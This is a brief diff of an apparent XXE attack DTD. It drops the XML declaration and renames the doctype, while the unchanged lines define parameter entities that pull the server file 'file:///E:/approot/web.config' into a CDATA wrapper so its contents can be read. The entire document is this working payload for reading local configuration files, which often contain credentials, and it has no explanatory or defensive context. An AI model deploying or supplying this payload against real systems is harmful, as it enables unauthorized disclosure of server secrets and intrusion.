@@ -1,5 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE data [
+<!DOCTYPE dtd [
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % goodies SYSTEM "file:///E:/approot/web.config">
 <!ENTITY % end "]]>">
